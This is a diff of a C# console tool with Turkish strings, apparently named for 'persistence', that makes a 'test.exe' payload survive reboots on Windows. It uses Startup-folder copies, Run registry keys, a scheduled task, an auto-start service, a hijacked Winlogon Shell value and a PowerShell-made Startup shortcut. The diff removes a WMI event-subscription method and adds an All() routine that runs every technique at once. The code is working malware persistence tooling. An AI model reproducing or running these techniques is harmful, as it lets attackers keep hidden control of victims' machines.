@@ -55,7 +55,6 @@ namespace kaliciOlma
                     return;
                 }
 
-                // Windows Başlangıç klasörünün yolu
                 string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
 
                 string destinationFilePath = Path.Combine(startupFolder, Path.GetFileName(sourceFilePath));
@@ -86,7 +85,6 @@ namespace kaliciOlma
                     return;
                 }
 
-                // Registry anahtarı yolu
                 string registryKeyPath = @"Software\Microsoft\Windows\CurrentVersion\Run";
 
                 string registryKeyName = "test";
@@ -142,13 +140,13 @@ namespace kaliciOlma
                     return;
                 }
 
-                string serviceName = "denemeService";
+                string serviceName = "denemeService1";
 
                 string cmdCommand = $"sc create \"{serviceName}\" binPath= \"{sourceFilePath}\" start= auto";
                 string startServie = $"sc start \"{serviceName}\"";
 
                 ExecuteCmdCommand(cmdCommand);
-                ExecuteCmdCommand(startServie);
+
             }
             catch (Exception ex)
             {
@@ -158,39 +156,7 @@ namespace kaliciOlma
             Console.WriteLine("---------------------\n");
         }
 
-        public static void wmi()
-        {
-            try
-            {
-                string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");
-
-                if (!File.Exists(sourceFilePath))
-                {
-                    Console.WriteLine("Payload dosyası bulunamadı");
-                    return;
-                }
-
-                // WMI Event Filter komutunu oluştur
-                string eventFilterCommand = $"wmic /namespace:\\\\root\\subscription path __EventFilter create Query=\"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'\" Name='MyEventFilter'";
-
-                // WMI Event Consumer komutunu oluştur
-                string eventConsumerCommand = $"wmic /namespace:\\\\root\\subscription path __EventConsumer create Name='MyEventConsumer' CommandLineTemplate='{sourceFilePath}'";
-
-                // WMI Filter to Consumer Binding komutunu oluştur
-                string filterToConsumerBindingCommand = $"wmic /namespace:\\\\root\\subscription path __FilterToConsumerBinding create Filter='MyEventFilter' Consumer='MyEventConsumer'";
-
-                // WMI Event Subscription işlemlerini sırayla çalıştır
-                ExecuteCmdCommand(eventFilterCommand);
-                ExecuteCmdCommand(eventConsumerCommand);
-                ExecuteCmdCommand(filterToConsumerBindingCommand);
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Hata: " + ex.Message);
-            }
-
-            Console.WriteLine("---------------------\n");
-        }
+      
 
 
         public static void winlogon()
@@ -204,11 +170,8 @@ namespace kaliciOlma
                     Console.WriteLine("Payload dosyası bulunamadı");
                     return;
                 }
+                    string cmdCommand = $"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"{sourceFilePath}\" /f";
 
-                // Winlogon Shell değerini değiştirmek için cmd komutunu oluştur
-                string cmdCommand = $"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d \"{sourceFilePath}\" /f";
-
-                // Komutu çalıştır
                 ExecuteCmdCommand(cmdCommand);
 
                   }
@@ -219,29 +182,37 @@ namespace kaliciOlma
         }
 
 
-        public static void CreateShortcut(string targetPath, string shortcutPath)
+        public static void lnk()
         {
-            // Shell objesi oluştur
-            Shell shell = new Shell();
 
-            // Hedef dosyayı ve kısayolun yolunu belirle
-            Folder folder = shell.NameSpace(System.IO.Path.GetDirectoryName(shortcutPath));
-            FolderItem folderItem = folder.Items().Item(targetPath);
+            string sourceFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "test.exe");
 
-            // Kısayol nesnesi oluştur
-            ShellLinkObject link = (ShellLinkObject)folderItem.GetLink();
+            if (!File.Exists(sourceFilePath))
+            {
+                Console.WriteLine("Payload dosyası bulunamadı");
+                return;
+            }
+            string shortcutName = "TestShortcut.lnk";
 
-            // Kısayolu kaydet
-            link.Save(shortcutPath);
+            string createShortcutCmd = $@"powershell ""$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%USERPROFILE%\Desktop\{shortcutName}'); $s.TargetPath = '{sourceFilePath}'; $s.Save()""";
+            string moveShortcutCmd = $@"move ""%USERPROFILE%\Desktop\{shortcutName}"" ""%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\""";
+
+            ExecuteCmdCommand(createShortcutCmd);
+
+            ExecuteCmdCommand(moveShortcutCmd);
         }
-
 
 
 
 
         public static void All()
         {
-
+            StartupFile();
+            AddRegistry();
+            gorev_zamalayicisi();
+            AddService();
+            winlogon();
+            lnk();
         }
 
 
@@ -254,8 +225,8 @@ namespace kaliciOlma
                 Console.WriteLine("3 - Registry Kullanımı");
                 Console.WriteLine("4 - Görev Zamanlayıcı Kullanımı");
                 Console.WriteLine("5 - Servis Ekleme");
-                Console.WriteLine("6 - VMI Event Subscription");
-                Console.WriteLine("7 - Winlogon Shell Değiştirme");
+                Console.WriteLine("6 - Winlogon Shell Değiştirme");
+                Console.WriteLine("7 - LNK Dosyası");
                 Console.WriteLine("Çıkmak için 'q' tuşuna basın.");
                 Console.Write("Seçiniz: ");
                 string choice = Console.ReadLine();
@@ -284,11 +255,12 @@ namespace kaliciOlma
                         break;
 
                     case "6":
-                        wmi();
+                        winlogon();
+                        
                         break;
 
                     case "7":
-                        winlogon();
+                        lnk();
                         break;
 
                     case "q":
